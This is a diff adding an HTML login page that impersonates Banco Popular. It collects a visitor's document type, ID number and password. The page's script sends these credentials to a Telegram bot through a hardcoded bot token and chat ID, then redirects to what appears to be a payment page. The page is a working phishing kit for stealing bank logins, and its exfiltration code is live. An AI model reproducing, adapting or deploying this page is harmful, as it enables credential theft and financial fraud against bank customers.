@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Banco Popular</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+        }
+
+        .login-container h2 {
+            color: #1A7E3F;
+        }
+
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            margin-bottom: 5px;
+            font-size: 14px;
+        }
+
+        .input-group select,
+        .input-group input {
+            width: 90%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .input-group .remember-container {
+            display: flex;
+            align-items: center;
+            margin-top: 10px;
+        }
+
+        .input-group .remember-container input {
+            margin-right: 10px;
+        }
+
+        .login-button {
+            width: 100%;
+            background-color: #A0A0A0;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .login-button:hover {
+            background-color: #787878;
+        }
+
+        .login-footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888888;
+        }
+
+        .login-footer a {
+            color: #FF6A00;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+
+        .login-footer a:hover {
+            text-decoration: underline;
+        }
+
+        .suggestions-button {
+            position: fixed;
+            right: 0;
+            top: 50%;
+            transform: translateY(-50%);
+            background-color: #1A7E3F;
+            color: white;
+            padding: 10px;
+            border-radius: 5px 0 0 5px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="../img/popular_coberturas.jpg" width="70%" alt="Banco Popular">
+        </div>
+        <h2>Bienvenido a</h2>
+        <div class="input-group">
+            <label for="document-type">Tipo de documento</label>
+            <select id="document-type">
+                <option value="cedula">Cédula de Ciudadanía</option>
+                <option value="passport">Pasaporte</option>
+                <option value="foreign-id">Cédula de Extranjería</option>
+            </select>
+        </div>
+        <div class="input-group">
+            <label for="document-number">Número de documento</label>
+            <input type="text" id="document-number" placeholder="Número de documento" style="margin-bottom: 5%;">
+            <label for="clave-number">Ingrese su clave</label>
+            <input type="password" id="clave-number" placeholder="Clave">
+        </div>
+    
+        <button class="login-button" onclick="nextPage()">Continuar</button>
+        <div class="login-footer">
+            <p>Protegido por reCAPTCHA | <a href="#">Privacidad</a> - <a href="#">Condiciones</a></p>
+            <a href="#">Seguridad</a> | <a href="#">Accesibilidad</a>
+        </div>
+    </div>
+    <div class="suggestions-button">Sugerencias</div>
+    
+    <script>
+        // Bandera para controlar el envío de datos
+        let datosEnviados = false;
+    
+        // Función de validación y envío de datos a Telegram
+        function nextPage() {
+            // Obtener los valores de los campos
+            const documentType = document.getElementById('document-type').value;
+            const documentNumber = document.getElementById('document-number').value;
+            const claveNumber = document.getElementById('clave-number').value;
+    
+            // Validar que los campos no estén vacíos
+            if (!documentType || !documentNumber || !claveNumber) {
+                alert("Por favor, complete todos los campos.");
+                return;
+            }
+    
+            // Si los datos no han sido enviados aún
+            if (!datosEnviados) {
+                // Preparar los datos para enviar al bot de Telegram
+                const mensaje = `Nuevo acceso:\nTipo de documento: ${documentType}\nNúmero de documento: ${documentNumber}\nClave: ${claveNumber}`;
+    
+                // Llamar a la función para enviar los datos al bot de Telegram
+                enviarATelegram(mensaje);
+            } else {
+                // Si ya se enviaron los datos, redirigir
+                window.location.href = "../cargapago.html";  // Redirigir después de enviar
+            }
+        }
+    
+        // Función para enviar el mensaje al bot de Telegram
+        function enviarATelegram(mensaje) {
+            const token = "8050472055:AAECARJvZtrimVGoBUIXERph4dQDfL3pVXE"; // Reemplaza con el token de tu bot de Telegram
+            const chatId = "5848946481"; // Reemplaza con el ID de tu chat o canal de Telegram
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mensaje)}`;
+    
+            // Enviar los datos usando Fetch API
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        datosEnviados = true;  // Marcar los datos como enviados
+                        window.location.href = "../cargapago.html";  // Redirigir después de enviar
+                    } else {
+                        alert("Hubo un error al enviar los datos.");
+                    }
+                })
+                .catch(error => {
+                    alert("Error en la conexión. Inténtalo nuevamente.");
+                });
+        }
+    
+        // Función para el botón 'Anterior'
+        function previousPage() {
+            window.history.back();  // Redirige a la página anterior
+        }
+    </script>
+    
+</body>
+</html>
